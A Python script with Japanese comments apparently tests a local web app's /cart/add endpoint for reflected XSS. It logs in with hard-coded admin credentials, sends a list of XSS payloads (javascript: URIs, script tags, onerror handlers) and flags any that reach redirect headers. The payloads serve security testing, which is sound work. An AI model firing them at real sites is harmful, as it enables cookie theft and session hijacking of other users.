import requests

# テスト用のペイロード
test_payloads = [
    '"test',
    'javascript:alert(1)',
    'javascript:alert("XSS")',
    'javascript:alert(document.cookie)',
    'javascript://test%0aalert(1)',
    'javascript:void(0);alert(1)',
    'vbscript:msgbox("XSS")',
    'data:text/html,<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    'test"><img src=x onerror=alert(1)>',
    'test"onmouseover="alert(1)',
]

print("=== /cart/add XSS脆弱性テスト ===")
print()

base_url = "http://localhost:5000"

# セッション作成（ログイン必要）
session = requests.Session()

# ログイン試行
login_data = {
    'username': 'admin',
    'password': 'admin123'
}

try:
    # ログイン
    login_response = session.post(f"{base_url}/login", data=login_data, allow_redirects=False)
    print(f"ログイン試行: {login_response.status_code}")
    
    for i, payload in enumerate(test_payloads, 1):
        print(f"\n[テスト {i}] ペイロード: {repr(payload)}")
        
        # カート追加リクエスト
        cart_data = {
            'product_id': payload,
            'quantity': '1'
        }
        
        response = session.post(f"{base_url}/cart/add", data=cart_data, allow_redirects=False)
        
        print(f"ステータス: {response.status_code}")
        
        if response.status_code == 302:
            location = response.headers.get('Location', '')
            print(f"リダイレクト先: {location}")
            
            # XSSペイロードの確認
            if 'javascript:' in location.lower():
                print("🔴 CRITICAL: JavaScript scheme detected!")
            elif '<script>' in location.lower():
                print("🔴 CRITICAL: Script tag detected!")
            elif 'alert' in location.lower():
                print("🟠 WARNING: Alert function detected!")
            elif 'onerror' in location.lower():
                print("🟠 WARNING: Event handler detected!")
        
        print(f"レスポンスヘッダー: {dict(response.headers)}")
        if response.text:
            print(f"レスポンス本文 (先頭200文字): {response.text[:200]}")

except Exception as e:
    print(f"エラー: {e}")
    import traceback
    traceback.print_exc()